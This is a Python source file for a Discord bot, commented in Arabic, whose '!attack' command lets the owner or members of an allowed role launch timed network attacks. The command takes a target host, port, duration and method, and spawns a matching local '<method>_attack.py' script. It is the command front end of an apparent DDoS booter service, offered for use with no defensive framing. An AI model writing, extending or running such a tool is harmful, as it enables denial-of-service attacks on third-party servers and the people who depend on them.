import discord
from discord.ext import commands

# إعداد صلاحيات البوت
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

# صلاحية الرول المسموح بها (غير ID الأونر)
ALLOWED_ROLE_ID = 123456789012345678  # ← عوّضها برقم رولك

# ID الأونر (عنده كامل الصلاحيات)
OWNER_ID = 898663928308060180

# عند تشغيل البوت
@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user} (ID: {bot.user.id})")

# أمر الهجوم
@bot.command()
async def attack(ctx, host: str, port: int, duration: int, method: str):
    if duration > 60:
        await ctx.send("🚫 المدة يجب أن تكون 60 ثانية أو أقل.")
        return

    # التحقق من الصلاحية
    author_id = ctx.author.id
    role_ids = [role.id for role in ctx.author.roles]
    if author_id != OWNER_ID and ALLOWED_ROLE_ID not in role_ids:
        await ctx.send("🚫 ليس لديك صلاحية تنفيذ هذا الأمر.")
        return

    await ctx.send(f"🚀 الهجوم على `{host}` لمدة `{duration}` ثانية بطريقة `{method}` بدأ...")

    import subprocess
    try:
        subprocess.Popen(["python3", f"{method}_attack.py", host, str(port), str(duration)])
    except Exception as e:
        await ctx.send(f"❌ خطأ في تشغيل الهجوم: {e}")
        return

    await ctx.send("✅ الهجوم تم إطلاقه بنجاح!")

# التحقق من التوكن
while True:
    token = input("🛡️ أدخل توكن البوت الخاص بك لتشغيله: ").strip()
    if len(token) < 30:
        print("❌ التوكن غير صالح أو ناقص، حاول مجددًا.")
    else:
        try:
            bot.run(token)
            break
        except discord.LoginFailure:
            print("❌ التوكن خاطئ! تأكد أنك نسخته صحيح من Discord Developer Portal.")
